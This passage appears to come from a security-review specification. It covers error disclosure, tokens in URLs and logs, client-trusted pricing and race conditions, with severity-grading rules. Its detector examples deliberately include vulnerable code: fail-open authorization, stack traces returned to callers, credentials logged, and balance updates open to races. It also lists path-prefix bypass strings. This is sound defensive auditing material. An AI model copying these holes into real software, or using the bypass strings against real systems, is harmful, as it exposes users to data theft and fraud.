**Verbose responses:** stack traces, SQL fragments, file paths, framework versions, internal hostnames, the failing query, and — the one that turns a Medium into a High — a secret, a token or regulated data inside the message. The pattern to require is a generic body plus a correlation identifier, with the detail logged server-side, and *the correlation identifier must not be the exception message*.

```detector
match: |
  # app/authz/client.py
  def can_access(user_id: str, resource_id: str) -> bool:
      try:
          resp = requests.get(
              f"{POLICY_URL}/allow", params={"u": user_id, "r": resource_id}, timeout=2
          )
          return resp.json()["allow"]
      except Exception:
          log.warning("policy service unavailable, allowing request")
          return True
nomatch: |
  # app/authz/client.py
  class PolicyUnavailable(Exception):
      pass

  def can_access(user_id: str, resource_id: str) -> bool:
      try:
          resp = requests.get(
              f"{POLICY_URL}/allow", params={"u": user_id, "r": resource_id}, timeout=2
          )
          resp.raise_for_status()
          payload = resp.json()
      except Exception as exc:
          raise PolicyUnavailable(str(exc)) from exc
      allow = payload.get("allow")
      if not isinstance(allow, bool):
          raise PolicyUnavailable("malformed policy response")
      return allow
```

```detector
match: |
  // src/server.ts
  app.use((err, req, res, next) => {
    res.status(500).json({ error: err.message, stack: err.stack, query: err.sql })
  })
nomatch: |
  // src/server.ts
  app.use((err, req, res, next) => {
    const correlationId = crypto.randomUUID()
    logger.error({ correlationId, err }, 'unhandled error')
    res.status(500).json({
      error: 'Internal error',
      correlationId,
    })
  })
```

### 31. Application log and URL content (`application-log-and-url-content`)

`A09:2025`. **This lens owns the identifier-in-URL finding**; `hipaa-and-phi` and `privacy-and-data-protection` supply the classification and the severity uplift and do not re-file it.

- **Secrets and identifiers in URLs.** An API key as a query parameter, a session or bearer token in a link, a password-reset or invite token in a path, a pre-signed URL, `?email=`, `?ssn=`, `?dob=`, a diagnosis or program code in a path segment. A URL is not a private channel: it lands in the web-server access log, every proxy and CDN log, browser history, the `Referer` sent to every third-party asset the page loads, error-tracker breadcrumbs, analytics page-URL fields, and anything the user pastes into a ticket.
- The mitigations, in order of strength: do not put the value in the URL (POST body, or a header); where a link must carry a token, make it single-use and short-lived, set `Referrer-Policy: no-referrer` on that route, and strip it from the address bar with `history.replaceState` after consumption; a fragment (`#token=`) is not sent to the server but is still in history and readable by any script on the page.
- **Log content.** Full request bodies, `Authorization` and `Cookie` headers, query strings logged wholesale by a request logger, an ORM's SQL-with-parameters at debug level, an exception that carries the record. Use an allowlist-based structured logger — a denylist forgets the field added next quarter, which is precisely what the canary recipe is for.
- **Log injection.** Unescaped newlines in a logged value forge log entries; the same value in a terminal viewer can carry ANSI escapes. Log structured records, not concatenated strings.
- Where a *correlation identifier fails to cross a service boundary*, that is `cross-boundary-attribution-logging` in `threat-modeling`. What a single service writes into its own line stays here.

```detector
match: |
  // src/routes/invites.ts
  router.get('/invite/:token', async (req, res) => {
    logger.info(`invite opened: ${req.originalUrl} by ${req.headers['user-agent']}`)
    const invite = await Invite.findOne({ where: { token: req.params.token } })
    res.render('invite', { invite })
  })
nomatch: |
  // src/routes/invites.ts
  router.get('/invite/:token', async (req, res) => {
    logger.info({ route: 'invite.open', inviteId: hashForLog(req.params.token) })
    const invite = await Invite.findOne({ where: { token: req.params.token } })
    res.set('Referrer-Policy', 'no-referrer')
    // the token is consumed here and the page reloads without it in the URL
    res.render('invite', { invite, stripTokenFromHistory: true })
  })
```

```detector
match: |
  # app/middleware/logging.py
  @app.after_request
  def log_request(response):
      log.info(
          "%s %s?%s body=%s auth=%s -> %s",
          request.method,
          request.path,
          request.query_string.decode(),
          request.get_data(as_text=True),
          request.headers.get("Authorization"),
          response.status_code,
      )
      return response
nomatch: |
  # app/middleware/logging.py
  LOGGED_QUERY_PARAMS = {"page", "per_page", "sort"}

  @app.after_request
  def log_request(response):
      log.info(
          "request",
          extra={
              "method": request.method,
              "route": request.url_rule.rule if request.url_rule else "unmatched",
              "params": {
                  k: v for k, v in request.args.items() if k in LOGGED_QUERY_PARAMS
              },
              "status": response.status_code,
              "correlation_id": g.correlation_id,
          },
      )
      return response
```

The safe form logs the *route pattern* rather than the resolved path, which is what keeps an identifier out of the line even when the identifier is in the URL. Both fixes are needed: keep the value out of the URL, and keep the URL out of the log.

### 32. Client-trusted business rules (`client-trusted-business-rules`)

`A06:2025`. The `business-logic` triage lens raises multi-step workflow abuse against this slug; the finding is written here.

- **A value the server should compute, arriving in the request.** A price, a subtotal, a discount, a tax amount, a shipping cost, a credit balance, a loyalty-point total, a plan tier, a trial-expiry date. The correct shape is: the client sends *identifiers and quantities*, the server computes money.
- **A rule enforced only in the client.** A disabled button, a `required` attribute, a step-order assumption in the SPA router, a maximum enforced by an input's `max`, a role read out of `localStorage`, a feature flag evaluated in the browser.
- **A negative, zero, fractional or absurd quantity** where the code assumes positive integers; a currency that does not match the price list; a rounding direction that always favors the caller; an integer overflow in a total.
- **Workflow-step skipping.** Posting the final step of a multi-step flow directly: submitting the confirmation after skipping payment, approving one's own request, transitioning a state machine along an edge the UI never offers. Enumerate the state machine's edges and check each transition's guard rather than checking the pages.
- **Coupon and entitlement composition**: stacking, reuse after refund, applying a per-account limit per-cart, redeeming concurrently ([item 33](#33-race-conditions-and-toctou-race-conditions-and-toctou)).

```detector
match: |
  // src/routes/checkout.ts
  router.post('/checkout', requireAuth, async (req, res) => {
    const { items, totalCents, discountCents } = req.body
    const charge = await payments.charge({
      customer: req.user.stripeId,
      amount: totalCents - discountCents,
    })
    await Order.create({ userId: req.user.id, items, charge: charge.id })
    res.json({ ok: true })
  })
nomatch: |
  // src/routes/checkout.ts
  router.post('/checkout', requireAuth, async (req, res) => {
    const { items, couponCode } = req.body
    const priced = await priceCart(req.user.id, items) // reads the price list
    const discount = await resolveCoupon(couponCode, req.user.id, priced)
    const charge = await payments.charge({
      customer: req.user.stripeId,
      amount: priced.totalCents - discount.cents,
      idempotencyKey: req.header('idempotency-key') ?? crypto.randomUUID(),
    })
    await Order.create({ userId: req.user.id, items: priced.lines, charge: charge.id })
    res.json({ ok: true })
  })
```

### 33. Race conditions and TOCTOU (`race-conditions-and-toctou`)

A check and its act separated by anything — a network hop, an `await`, a second query — is a window. The classes that pay:

- **Balance, quota and inventory.** `SELECT balance` then `UPDATE balance = balance - n` in two statements. The atomic forms: a conditional update (`UPDATE ... SET balance = balance - :n WHERE id = :id AND balance >= :n` and check the affected-row count), `SELECT ... FOR UPDATE` inside the transaction, an optimistic version column, or a database constraint that makes the bad state unrepresentable.
- **Single-use tokens and coupons.** Redemption must be a conditional update on the unused row, not a read-then-write.
- **Uniqueness.** A "does this email exist" check followed by an insert is a race that a unique index closes and application code does not.
- **Idempotency on anything that moves money or sends a message.** An idempotency key stored with the result, checked inside the same transaction. A double-submitted form and a client retry are the common triggers; an attacker sending twenty parallel requests is the uncommon one.
- **Transaction isolation is part of the claim.** At `READ COMMITTED` — the PostgreSQL default — two concurrent read-modify-write transactions both succeed and one overwrites the other; `SERIALIZABLE` turns that into a retryable error the application must actually retry. If the fix is isolation level, the finding must also say who handles the serialization failure.
- File-system TOCTOU is [item 17](#17-path-traversal-and-file-access-path-traversal-and-file-access); the validate-then-connect window is [item 19](#19-server-side-request-forgery-ssrf-application-path). Both are this pattern with a different resource.

```detector
match: |
  # app/wallet/service.py
  def withdraw(session, account_id, cents):
      account = session.query(Account).get(account_id)
      if account.balance_cents < cents:
          raise InsufficientFunds()
      account.balance_cents -= cents
      session.commit()
      return account.balance_cents
nomatch: |
  # app/wallet/service.py
  def withdraw(session, account_id, cents):
      updated = session.execute(
          update(Account)
          .where(Account.id == account_id, Account.balance_cents >= cents)
          .values(balance_cents=Account.balance_cents - cents)
      )
      if updated.rowcount != 1:
          session.rollback()
          raise InsufficientFunds()
      session.commit()
```

## Severity calibration

`severity_floor: low` is presentational. It orders this lens's findings in the report. It never suppresses a finding, and no item above may be dropped because it lands at Low or Info.

**Two rules do most of the work here.**

- **No unconditional High.** Every High and Critical below names the concrete artifact that establishes its condition — a file glob, a configuration key, a route registration, an API symbol. A condition no artifact in the checkout can satisfy is not caution; it silently downgrades every instance of the finding forever, which is worse than no rule at all.
- **This lens does not classify data.** "It returns PII" and "it returns ePHI" are `personal-data-severity-uplift` and `phi-severity-uplift`, owned by `privacy-and-data-protection` and `hipaa-and-phi`. Grade the access-control or disclosure defect on its own terms and let the uplift come from the lens that owns the classification. A grade that already assumes the data class double-counts it.

### The re-graded instructions

The severity guidance this lens inherited contradicted the false-positive material it also inherited, in six places. Where a table row and a suppression rule disagree, the auditor follows the row — it is the one with a number in it — so correcting only the prose would have left every one of these operational. Each row below is the corrected version, and the corresponding false-positive entry has been reconciled to it.

| Inherited instruction | Why it was wrong | Re-graded |
|---|---|---|
| "**BOLA/IDOR on PII**: Critical. **BOLA/IDOR on non-sensitive data**: High." | Grades the data class, which this lens does not own, and fires on the `findById(params.id)` shape whose scoping is frequently structural and one layer away. | **Critical** when a non-owner reaching the object is demonstrated (recipe R1) or when the loading query provably carries no ownership predicate on any path — read *and* write *and* bulk *and* export. **High** when the missing predicate is established on the read path only. **Medium** when scoping exists but is applied per-query rather than at a layer that cannot be forgotten. Regulated-data uplift is applied by `hipaa-and-phi` or `privacy-and-data-protection`, not here. |
| "**CSRF on state-changing endpoint**: High (Medium if the impact is limited)." | Fires on JSON APIs authenticated solely by a bearer header, where no ambient credential exists to forge, and ignores that `SameSite=Lax` is the Chromium default. | **High** only with a nameable delivery path, each of which is a repository-visible artifact: a state-changing `GET` (carried by a top-level navigation, not by an `<img>`), a cookie set `SameSite=None`, or an attacker-controllable same-site subdomain. Credentialed CORS reflection is **not** a delivery path — it does not cause a `Lax` cookie to be attached; it is a response-read defect on its own row, and it belongs in a CSRF finding only as a defeat of the anti-CSRF token on a request the cookie already accompanies. **Low/Medium** for a missing token on a POST-only route whose session cookie is `Lax`, written as defense in depth. **Not a finding** where the only credential is `Authorization: Bearer` — see false positive 1. |
| "**Missing CSP**: Medium standalone; High if combined with any reflected output." | The second clause grades the mitigation instead of the defect, and the first fires on JSON-only APIs where CSP does nothing. | **Medium** on a route that returns HTML a browser renders, established by finding the template render, SSR response or static-file handler. **Info** on a JSON-only API. Where unescaped reflected output exists, **the XSS is the finding** at its own severity and the absent CSP is recorded in its `impact` as the missing second line of defense — never as a separate High. |
| "**Missing rate limit on login**: High. **On password reset**: High." | Where the application delegates authentication, the limiter lives in the identity provider and an unconditional High produces a finding the team closes as wrong. (An edge WAF is the *other* thing people say here, and it is not a reason to downgrade — see the re-graded cell.) | **High** where the application owns the credential check itself — a local password comparison in the handler — and no limiter is reachable in the repository (`express-rate-limit`, `flask-limiter`, DRF throttles, `Rack::Attack`, a gateway policy in the checkout). **Info, written as a question with the verification step**, where authentication is delegated to an identity provider — established from the repository, by an OIDC/SAML client library and a redirect to a hosted login, with no password comparison in any handler. That is the *only* exemption. "The path probably terminates at an edge this repository does not contain" is not one: no artifact can falsify it, every production application has such an edge, and admitting it here would downgrade every instance of this finding forever — see the anti-pattern rule below and the rejected candidate on CDN-set headers, which is the same claim in the same direction. Two variants stay **High** regardless: a limiter keyed on a raw `X-Forwarded-For` behind a proxy that does not normalize it, and a limiter that covers the endpoint but not the business flow. |
| "**GraphQL introspection in prod**: Medium." | Whether it is on in production is usually decided by `NODE_ENV`, not by the code, and Apollo Server 4 already closes it there. | **Low** where the server library disables it under a production environment setting and nothing overrides it. **Medium** where `introspection: true` is set unconditionally, or where no environment plumbing sets the production flag. The cost-bearing GraphQL findings — unbounded depth or complexity, aliased repetition, batching enabled and uncapped — are graded on their own rows and do not depend on introspection. |
| "**JWT `alg: none` accepted**: Critical." | Correct as a fact and **not this lens's finding**: `jwt-jws-and-jwks-verification` is deferred to `crypto-and-key-management`, so a Critical row here would be filed twice or filed by the lens that cannot verify it. | **Removed from this lens's table.** Route signature and claim verification to crypto with the file and line. What stays here is token *handling*: a token in a URL (item 31), a session that outlives logout with no revocation path (item 8), and a cookie carrying a token without `Secure`/`HttpOnly` (item 8). |

### How to establish "reachable without authentication"

Several rows below turn on it, so the evidence standard is fixed here rather than restated. It is established by one of: a route registered before the authentication middleware in the server entry point; an explicit exemption (`@csrf_exempt` is not one, but `permission_classes = [AllowAny]`, `@AllowAnonymous`, `.permitAll()`, a `PUBLIC_PATHS` entry, `skip_before_action :authenticate_user!` are); a static-file or documentation handler mounted outside the guarded tree; or an anchored public-path pattern that also matches the route. Absent all of those, "unauthenticated" is an assumption — write it down with the verification step, and grade the finding as if it were authenticated-but-unauthorized, which is the direction that fails safe.

### Severity table

| Finding | Severity | Condition that earns it |
|---|---|---|
| Object-level authorization missing on a mutating or exporting route | Critical | The route is in the route registry, the loading call is quoted, and no predicate ties the object to the caller on that path. Recipe R1 returning the marker as the second subject settles it; without the run, the quoted query plus the absent predicate is sufficient for High and the Critical needs the proof or a mutating verb. |
| Cross-tenant read reachable because the tenant predicate is per-query rather than enforced at a layer | Critical | Established from the absence of RLS (`CREATE POLICY` in migrations, and **either** spelling of the per-transaction setting — `SET LOCAL` or `set_config`), of an ORM global scope or base repository, and of per-tenant connections — plus at least one query that omits the predicate. |
| Tenant taken from a caller-supplied header, body field or subdomain without comparison to the session | Critical | The assignment line is quoted (`req.header('X-Tenant-ID')`, `request.json["tenant_id"]`) and no comparison to the authenticated principal follows it. |
| Administrative or privileged operation reachable by a non-privileged caller | Critical | Established from the middleware mounting order in the server entry point, or from a public-path pattern that matches the route, or from a missing role check on the handler *and* on every other entry point to the same operation (queue consumer, scheduled job, gRPC method). |
| Injection with caller-controlled input reaching the query, command or template | Critical | Taint traced from a named request source to the concatenation, and the sink quoted. Without traced taint it is **Medium**, written as a hardening finding — that distinction is what stops a report full of `Database.query`-shaped noise. |
| Remote code execution through deserialization of request-controlled bytes | Critical | The sink is quoted and the bytes are traced to a request. Unconditional sinks: `pickle.loads`, `ObjectInputStream.readObject`, `XMLDecoder`, PHP `unserialize`, `Marshal.load`. Two are **version-conditional and are graded from the pin, never on sight** — item 16 carries the detail and this row must not be applied past it. `yaml.load` earns the Critical with `Loader=yaml.Loader` or `Loader=yaml.UnsafeLoader`; `FullLoader` is **not** remote code execution and is not this row, `safe_load`/`SafeLoader` is the fix, and under PyYAML 6 a bare `yaml.load(data)` raises rather than running. Ruby `YAML.load` is conditional the same way, on Psych 4. `BinaryFormatter` earns it on .NET Framework, where it is always live; on modern .NET it is disabled by default, so the quotable artifact is the re-enabling switch — an `<EnableUnsafeBinaryFormatterSerialization>true</EnableUnsafeBinaryFormatterSerialization>` property in the `.csproj` or the `System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization` AppContext switch, plus, from .NET 9 where the in-box implementation always throws, a `PackageReference` to the unsupported `System.Runtime.Serialization.Formatters` compatibility package. Read `<TargetFramework>` from the `.csproj`: a `BinaryFormatter` call on a current target with none of those present is a dead-code removal to recommend, not a Critical to file. The .NET siblings item 16 lists — `LosFormatter`, `NetDataContractSerializer`, `SoapFormatter`, `Json.NET` with `TypeNameHandling` other than `None` — carry no such switch and earn the row on the call alone. |
| SSRF where the destination reaches a metadata endpoint or an internal service | Critical | The outbound call is quoted, the validation (if any) is quoted, and one of these holds: no deny-list; a hand-written deny-list omitting loopback, CGNAT `100.64.0.0/10` or the metadata addresses; an `is_private`-only check, which passes CGNAT; a validate-then-reresolve gap; redirects followed. Recipe R4's rebinding case is the strongest evidence. **High** where egress is provably confined by a proxy and only the parser differential remains. |
| Stored XSS on an authenticated page | Critical | The write path stores caller text and the read path reaches an HTML sink with no context-correct encoding, both quoted. **High** for reflected XSS; **High** for stored XSS on an unauthenticated page with no session to steal. A nonce-based CSP with no `unsafe-inline` and no `unsafe-eval` reduces both by one level, and only if the policy is delivered on that route. |
| Fail-open authorization at a dependency boundary | Critical | The `except`/`catch`/timeout branch that returns an allow is quoted, and the branch is reachable from a caller-triggerable failure. Recipe R8 proves it. |
| Mass assignment writing a privilege, ownership or money field | Critical | Both halves quoted: the whole-body bind (`Object.assign`, `permit!`, `fields = "__all__"`, `fill($request->all())`) **and** the model or schema showing a field from the escalation set (`role`, `is_admin`, `owner_id`, `tenant_id`, `email_verified`, `balance`, `price`, `plan`). **High** where the writable set is caller-visible but not privileged. |
| Webhook handler acting before verification, or accepting a missing signature header | High | The handler body is quoted showing the side effect ahead of the check, or the `if (sig && ...)` shape. **Critical** where the event moves money or grants entitlement. |
| Secret in the browser bundle | High | The value is a non-publishable credential (`sk_live_`, a service-account JSON, a database URL, a signing secret) and it is reachable from client code — a public env prefix, a `define`, a server-only import into a client component, or a serialized data-loader prop. **Critical** where the value carries a live-environment prefix or shape (`sk_live_`, `AKIA`, a service-account JSON with a populated `private_key`, a database URL with a host that is not `localhost`) **and** the value is still present at `HEAD` rather than only in history. Do **not** condition the Critical on the key being "unrotated": a repository shows when a value was added and never whether the provider rotated it, so that condition can never be satisfied and would downgrade the row forever — see the no-unconditional-High rule above. Whether it was rotated is a question for the client, recorded next to the finding, not an input to the grade. **Info** for a publishable key, always paired with the question of whether the server enforces what the key does not. |
| Whole-model serialization returning authentication material on the way out | High | Both halves quoted, on the pattern of the mass-assignment row: the serialization site (`res.json(user)` on an ORM instance, `fields = "__all__"` in a DRF serializer, `SELECT *` whose rows reach the response, `render json: @user` with no serializer, `JsonConvert.SerializeObject(entity)`, a GraphQL type generated from the table) **and** the model, migration or schema showing a field from the disclosure set (`password_hash`, `mfa_secret`, `reset_token`, `api_key`, `is_admin`, `internal_notes`, `risk_score`). **Critical** where the returned value is replayable as a credential rather than a hash — a live `reset_token`, an `mfa_secret`, an API key. **Medium** where the over-returned fields are internal but not authentication material, and **Medium** where the same object is serialized safely on one route and wholesale on another, with both serializers quoted. Regulated-data uplift comes from `hipaa-and-phi` or `privacy-and-data-protection`, not from this row. |
| Proxy path-prefix ACL that the application does not also enforce | High | Both sides quoted: an unanchored path-prefix denial at the edge (`location /admin {` in a checked-in nginx config, an ingress `path:` prefix rule, a CDN or WAF path rule) **and** the same route in the application's own route table with no guard on the handler. The near-miss set that separates the two parsers — `/admin/..;/`, `/%2e%2e/admin`, `//admin`, `/admin.`, a case difference against a case-insensitive route table — is what makes the mismatch concrete; name the one the framework's router accepts. **Critical** where the tree is administrative and item 3's standard establishes no role check on the handler at all. **Medium** where the application authorizes independently and only the edge pattern is loose. |
| Caller-supplied forwarding header trusted for an access, attribution or URL-construction decision | High | The read is quoted (`x-forwarded-for`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) reaching an authorization branch, an absolute-URL or password-reset-link construction, or an audit field — **and** no trusted-proxy configuration is present (`app.set('trust proxy', n)`, `ProxyFix`, `ForwardedHeadersOptions.KnownProxies`, `SECURE_PROXY_SSL_HEADER`). The rate-limit-key use has its own row below; do not file both. **High** also for `insecureHTTPParser: true` or a hand-written HTTP parser in the request path. **Medium** where the value is only written to a log. **Not gradable from a repository:** the request-desync itself, which needs the deployed proxy–origin pair. Say that rather than implying the class was cleared, and never invent a grade for it. |
| Personal, account or record identifier carried in a URL path or query string | Medium | The route definition or the link construction is quoted with the identifier in the path or the query — `?email=`, `?ssn=`, `?dob=`, a member or record number in a path segment, a diagnosis or program code. This is the **base grade** that `hipaa-and-phi` and `privacy-and-data-protection` apply their uplift to; they do not re-file it and this row must not be skipped because the data is regulated. **High** where the same route also writes the resolved URL to a log, or where the page loads a third-party asset that receives it in `Referer` — both quotable. The credential and session-token case is the separate High row above. |
| Request logger writing credentials, whole bodies or whole query strings | High | The logging call is quoted taking `Authorization`, `Cookie`, `request.get_data()`/`req.body`, or the full query string, rather than an allowlisted field set. **High** likewise for an ORM logging SQL with bound parameters at debug in a production configuration path (`create_engine(..., echo=True)`, the `django.db.backends` logger at `DEBUG`, `config.log_level = :debug` in `config/environments/production.rb`). **Medium** where the logger writes the resolved path rather than the route pattern and identifiers appear in it, and **Low** for concatenated rather than structured log records with no escaping of newlines in a logged value. |
| Session identifier not rotated at authentication | High | The login handler is quoted with no `regenerate` / `cycle_key` / `reset_session` and no framework call that performs it. |
| Authentication cookie without `Secure` or `HttpOnly` | High | The cookie-attribute site is quoted with the attribute absent **or absent-by-default**, on the cookie that carries the session. That site is one of three, and the second and third are the common ones: an explicit `res.cookie` / `set_cookie` call; a session-middleware options object (`session({ cookie: {…} })`, `config.session_store :cookie_store, …`, `options.Cookie.SecurePolicy`); or the framework settings key (`SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY`) — for which quoting the settings module you searched, with the key not in it, is the artifact. **Medium** for a missing or unset `SameSite` alone, since the Chromium default is `Lax`; Firefox has not shipped Lax-by-default, so do not state it as "the browser default". |
| Logout that does not invalidate server-side, with no revocation path anywhere | High | Established from the logout handler plus the absence of a session store deletion, a token-revocation list or a refresh-token rotation record. **Low** where access tokens are short-lived and refresh revocation exists — that is the documented stateless tradeoff. |
| Credential, session token or reset token carried in a URL | High | The route definition or the link construction is quoted. **Critical** where the same route logs the full URL or the page loads third-party assets that receive it in `Referer`. Classification of any personal or health data in the URL, and the uplift that follows, come from the compliance lenses. |
| CORS reflecting the request origin with credentials | High | `origin: true`, an echo of `req.headers.origin`, or an unanchored regex, **together with** `credentials: true` or `Access-Control-Allow-Credentials: true`. Without credentials it is **Low**; a literal `*` on a public route is **Info**. |
| Open redirect | Medium | The redirect sink and the caller-controlled source are quoted. **High** where the route is part of an authentication, password-reset or invite flow and the destination receives a token or a session-bearing request. OAuth `redirect_uri` validation itself is crypto's. |
| Path traversal reaching a read outside the intended root | High | The join is quoted and the confinement check is absent or defeated (`os.path.join` with a caller-absolute segment, a `startsWith` without a separator, a normalize-without-confine). **Critical** where the same primitive writes. |
| Upload stored under the web root with a caller-controlled name | High | The destination path and the naming are quoted. **Critical** where the served `Content-Type` allowlist admits `image/svg+xml` or `text/html` inline from the application origin, which turns it into stored XSS. |
| Missing depth or complexity limit on a GraphQL endpoint | High | The server construction is quoted with no depth, cost or persisted-query control **mounted in a slot that server engine executes**, and at least one recursive or list-returning field exists in the schema. Read the slot, not the import, in both directions. An Apollo Server 4 construction carrying `validationRules` from `ApolloArmor().protect()`, or `depthLimit(n)`, is **not** this finding even though nothing in its `plugins` array limits anything — that is where Apollo runs depth and cost. Conversely, an Envelop-only export (`maxDepthPlugin` or `costLimitPlugin` from a per-rule `@escape.tech/graphql-armor-*` package) sitting in Apollo's `plugins` array does not run and does **not** clear the row; that shape earns the High with the mis-wiring quoted as the reason. Recipe R7's resolver-spy assertion distinguishes "rejected" from "executed then truncated", and settles the wiring where reading the slot leaves it ambiguous. |
| Rate limiting absent where the application owns the credential check | High | Two artifacts, both required: a password comparison in the handler itself (`bcrypt.compare`, `check_password`, `verify_password`), and no limiter reachable in the repository — no `express-rate-limit`, `flask-limiter`, `Rack::Attack`, DRF `throttle_classes`, `limit_req` in a checked-in nginx config, or gateway usage plan. The only exemption is delegated authentication, and it too must be established from the checkout — an OIDC/SAML client library and a redirect to a hosted login, with no password comparison in any handler. An unlocatable upstream edge is not an exemption. |
| Rate limiter keyed on an unnormalized forwarded header | High | The `keyGenerator` is quoted and no trusted-proxy configuration (`trust proxy`, `ProxyFix`, `KnownProxies`, `SECURE_PROXY_SSL_HEADER`) is present. |
| Read-modify-write on a balance, quota, coupon or inventory row | High | The two-statement sequence is quoted and no conditional update, row lock, version column or unique constraint is present. **Critical** where the resource is money and no idempotency key exists on the endpoint. |
| Price, discount or entitlement taken from the request body | High | The charge or grant call is quoted taking the value from the request rather than from a server-side price list. **Critical** where it is reachable by any authenticated user and the effect is immediate. |
| Authenticated response marked publicly cacheable | High | `Cache-Control: public` or `s-maxage` on a route behind an authentication guard, or an edge rule caching by extension over a path the router also serves. **Medium** where the body is not user-specific. |
| WebSocket upgrade with no origin check and cookie-based authentication | High | The server construction is quoted with no `verifyClient` or origin comparison, and the connection handler reads a session from `req.headers.cookie`. |
| Debug mode or Actuator wildcard exposure in a production configuration path | High | The literal is quoted from the production configuration file — `management.endpoints.web.exposure.include=*`, `DEBUG = True` (including an environment default of `True`), `APP_DEBUG=true`, `<customErrors mode="Off">`. **Critical** where the exposed endpoint dumps memory or environment (`/actuator/heapdump`, `/actuator/env`) and the route is reachable per the standard above. |
| Verbose error body carrying a stack trace, SQL or a file path | Medium | The error handler is quoted. **High** where the message can carry a secret, a token or regulated data — establish that from what is put into the exception, not from the possibility. |
| Deprecated API version still routed with weaker guards than its successor | High | Both route registrations are quoted and the guard diff is shown. **Medium** where the guards match and only the inventory hygiene is missing. |
| Third-party script without `integrity` on a page that handles credentials or payment | High | The tag is quoted and the page's role is named. **Medium** on other pages. **Not a finding** for a same-origin first-party script. Where the script is a loader that injects further scripts, say that SRI cannot bound it rather than reporting it fixed. |
| Vendor response rendered or parsed without validation | Medium | The parse or render is quoted. **High** where the sink is an HTML context on an authenticated page, or where a vendor-supplied URL is fetched by the application. |
| Missing security header on an HTML route | Medium | HSTS, `nosniff`, `frame-ancestors`/`X-Frame-Options` on a route that renders a document. **Info** for a missing `Referrer-Policy`, since `strict-origin-when-cross-origin` is the current browser default; **Medium** where the configured policy is weaker than that default. |
| Account enumeration through differing responses | Medium | The two branches are quoted with different status codes or bodies. **Low** where the product deliberately discloses address existence at registration and a rate limit is present. |
| Password policy imposing composition rules, rotation, or a maximum length below 64 | Low | The validator is quoted. This is a usability-and-strength finding, not an exploitable one; it becomes **Medium** combined with a missing breach-corpus check on a consumer-facing login. |
| `TRACE` enabled | Info | Recorded for completeness. Cross-site tracing has not been exploitable from mainstream browsers for many years; do not present it as a live attack path, and never let it occupy a slot above a real finding. |
| Directory listing enabled | Medium | The directive is quoted (`autoindex on`, `Options +Indexes`, `serve-index`, `dotfiles: 'allow'`). **High** where the listed directory contains configuration, backups or `.git`. |

### Anti-patterns, stated as rules

- **Never grade on the sink alone.** `dangerouslySetInnerHTML`, `Database.query`, `exec`, `res.redirect` and `findById` are candidates. The grade comes from traced taint, from reachability, and from what the object is — never from the presence of the symbol.
- **Never clear a finding because a control might exist upstream, and never assert one because it might not.** The WAF, the gateway, the IdP and the CDN are all real and all invisible. Both directions require evidence; where there is none, the finding stays open at the lower grade with the assumption and the verification step written out.
- **Do not double-file across the boundary.** One defect, one finding, in the lens that owns the slug. Where this lens finds the sink and another lens owns the source — model output, a Salesforce entry point, a mobile bridge — the aggravator goes in `impact` and the other lens gets the file and the line.
- **Do not import a severity from a category name.** `A01:2025` is not a severity, and neither is "Critical" in a vendor scanner's output. Every grade above Medium in this lens is conditioned on an artifact named in the table.

## Known false positives

Each entry names a pattern a competent reviewer would flag and states why it is not the finding it looks like. **None of these is a licence to drop a finding**: every one names the narrower finding that does survive, and each is reconciled with the severity row that grades it.

1. **"Missing CSRF protection" on a JSON API whose only credential is `Authorization: Bearer <token>`.** CSRF requires an ambient credential the browser attaches by itself. A header a hostile origin cannot set — and which forces a CORS preflight the server must opt into — leaves nothing to forge. Even for cookie sessions, the Chromium `SameSite=Lax` default blocks classic cross-site form POSTs, so a missing token on a POST-only Lax-cookie route is defense in depth, not a High. **What survives:** escalate when you can name the delivery — a `GET` that changes state and is reachable by a top-level navigation, a cookie set `SameSite=None`, or an attacker-controlled same-site subdomain. Credentialed CORS reflection does not belong on that list: it never causes a `Lax` cookie to be attached, so it cannot supply the delivery; it is its own finding, and its only role in a CSRF write-up is letting a hostile origin read the anti-CSRF token out of a response the cookie was already going to reach. Also check that the API genuinely refuses cookie authentication rather than accepting either credential, because "bearer only" is frequently the documentation rather than the code.

2. **`Access-Control-Allow-Origin: *` on a public, unauthenticated endpoint.** The browser refuses to use a literal `*` together with credentials, so a wildcard response cannot expose authenticated data. On config, health, documentation or CDN routes it is correct and intentional — Info at most. **What survives:** the exploitable shape is reflection — `cors({origin: true, credentials: true})`, an unanchored regex such as `/trusted\.com/` matching `trusted.com.evil.com`, or accepting `Origin: null`. Check also that the "public" endpoint is genuinely public: a wildcard on a route that becomes authenticated later is a wildcard on an authenticated route.

3. **"IDOR/BOLA" on `findById(params.id)`-shaped code.** Ownership scoping is often structural rather than local: `current_user.orders.find(...)`, a DRF `get_queryset`, a Django manager or Hibernate `@Filter`, a repository base class injecting `WHERE org_id = :ctx`, `SET app.tenant_id` plus Postgres row-level security, a Prisma client extension. Follow the query chain to the scope before filing. **What survives, and it is the larger half:** do not *clear* the finding because a scope exists on the read path. Check `PATCH`, `DELETE`, bulk, export and custom-action paths separately — the DRF example in item 1 has a correct `get_queryset` and a custom action that bypasses it, and that is the shape that ships.

4. **"No authentication on this endpoint" when the guard is registered outside the reviewed file.** `app.use(requireAuth)` before the router mounts, a NestJS global `APP_GUARD`, `dependencies=[Depends(current_user)]` on the `APIRouter`, a Spring `SecurityFilterChain` matcher, `[Authorize]` on a base controller, a Rails `before_action` in `ApplicationController`, or an authenticating gateway all leave the handler looking bare. Absence of a decorator is not evidence. **What survives:** the inverse is worth hunting — a route mounted above the middleware, or a public-path list that prefix-matches (`/public` also matching `/publications/secret`). And if the registration cannot be obtained, write it in Notes as an assumption with the verification step rather than as either a finding or a clearance.

5. **"Missing rate limiting" on login, password reset, or an expensive endpoint.** The limiter is usually terminated before the application — Cloudflare or another WAF, nginx `limit_req`, API Gateway usage plans, Kong or Envoy filters — and for login and reset specifically it commonly lives in the identity provider, which throttles and locks out natively. If you do not own the login handler you do not own its limiter — and that is a repository question with an answer, not an assumption: look for a password comparison in a handler. Finding none, and finding an OIDC/SAML client redirecting to a hosted login, is what earns this entry. **Never invoke it on the bare possibility of an edge the checkout does not contain**; that version of the claim is unfalsifiable and is rejected in the re-graded table, in the anti-pattern rules and in the rejected candidates. **What survives:** two variants stay in scope at full severity — a limiter keyed on a raw `X-Forwarded-For` behind a proxy that does not normalize it, and a limiter that protects the endpoint but not the business flow. And where the application *does* compare the password itself, the limiter is the application's problem and its absence is a real High.

